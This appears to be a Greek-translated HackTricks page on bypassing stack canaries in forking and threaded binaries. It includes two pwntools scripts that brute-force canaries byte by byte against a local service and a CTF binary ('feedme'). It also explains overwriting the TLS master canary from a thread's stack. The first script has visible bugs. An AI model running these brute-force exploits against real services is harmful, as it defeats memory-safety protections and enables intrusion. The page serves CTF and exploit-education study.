# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

**Αν αντιμετωπίζετε ένα δυαδικό που προστατεύεται από ένα canary και το PIE (Position Independent Executable) πιθανότατα χρειάζεστε έναν τρόπο για να τα παρακάμψετε.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
Σημειώστε ότι το **`checksec`** ενδέχεται να μην εντοπίσει ότι ένα δυαδικό προστατεύεται από ένα canary εάν αυτό ήταν στατικά μεταγλωττισμένο και δεν είναι ικανό να αναγνωρίσει τη λειτουργία.\
Ωστόσο, μπορείτε να παρατηρήσετε χειροκίνητα αυτό εάν διαπιστώσετε ότι μια τιμή αποθηκεύεται στη στοίβα στην αρχή μιας κλήσης συνάρτησης και αυτή η τιμή ελέγχεται πριν από την έξοδο.
{% endhint %}

## Βίαιη δύναμη Canary

Ο καλύτερος τρόπος για να παρακάμψετε ένα απλό canary είναι εάν το δυαδικό είναι ένα πρόγραμμα **που δημιουργεί παιδικές διεργασίες κάθε φορά που καθιερώνετε μια νέα σύνδεση** μαζί του (υπηρεσία δικτύου), επειδή κάθε φορά που συνδέεστε σε αυτό **θα χρησιμοποιηθεί το ίδιο canary**.

Στη συνέχεια, ο καλύτερος τρόπος για να παρακάμψετε το canary είναι απλώς να το **επιτεθείτε βίαια χαρακτήρα προς χαρακτήρα**, και μπορείτε να καταλάβετε εάν το μάντεψε canary byte ήταν σωστό ελέγχοντας εάν το πρόγραμμα έχει καταρρεύσει ή συνεχίζει την κανονική του ροή. Σε αυτό το παράδειγμα η συνάρτηση **επιτίθεται βίαια σε ένα canary 8 Bytes (x64)** και διακρίνει μεταξύ ενός σωστού μαντεμένου byte και ενός κακού byte απλώς **ελέγχοντας** αν ένα **αποτέλεσμα** επιστρέφεται από τον εξυπηρετητή (μια άλλη μέθοδος σε **άλλη κατάσταση** θα μπορούσε να είναι η χρήση ενός **try/except**):

### Παράδειγμα 1

Αυτό το παράδειγμα υλοποιείται για 64bit αλλά θα μπορούσε εύκολα να υλοποιηθεί για 32 bit.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Παράδειγμα 2

Αυτό υλοποιείται για 32 bits, αλλά μπορεί εύκολα να αλλάξει σε 64 bits.\
Επίσης, σημειώστε ότι για αυτό το παράδειγμα το πρόγραμμα περιμένει πρώτα ένα byte για να υποδείξει το μέγεθος της εισόδου και του φορτίου.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Νήματα

Τα νήματα του ίδιου διεργασίας θα **μοιράζονται το ίδιο διακριτικό canary**, επομένως θα είναι δυνατό να **δοκιμαστεί βίαια** ένα canary αν το δυαδικό αρχείο δημιουργεί ένα νέο νήμα κάθε φορά που συμβαίνει μια επίθεση.

Επιπλέον, μια **υπερχείλιση buffer σε μια συνάρτηση με νήματα** που προστατεύεται με canary θα μπορούσε να χρησιμοποιηθεί για να **τροποποιήσει τον κύριο canary που αποθηκεύεται στο TLS**. Αυτό συμβαίνει επειδή είναι πιθανό να φτάσει στη θέση μνήμης όπου αποθηκεύεται το TLS (και, συνεπώς, το canary) μέσω μιας **υπερχείλισης buffer στη στοίβα** ενός νήματος.\
Ως αποτέλεσμα, η αντιμετώπιση είναι άχρηστη επειδή ο έλεγχος χρησιμοποιείται με δύο canaries που είναι τα ίδια (αν και τροποποιημένα).\
Αυτή η επίθεση πραγματοποιείται στο writeup: [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)

Ελέγξτε επίσης την παρουσίαση του [https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015](https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015) η οποία αναφέρει ότι συνήθως το **TLS** αποθηκεύεται από το **`mmap`** και όταν δημιουργείται μια **στοίβα** ενός **νήματος** δημιουργείται επίσης από το `mmap` σύμφωνα με αυτό, το οποίο μπορεί να επιτρέψει την υπερχείλιση όπως φαίνεται στο προηγούμενο writeup.

## Άλλα παραδείγματα & αναφορές

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, no PIE, nx, BF canary, εγγραφή σε κάποια μνήμη ενός ROP για να καλέσει το `execve` και να μεταβεί εκεί.
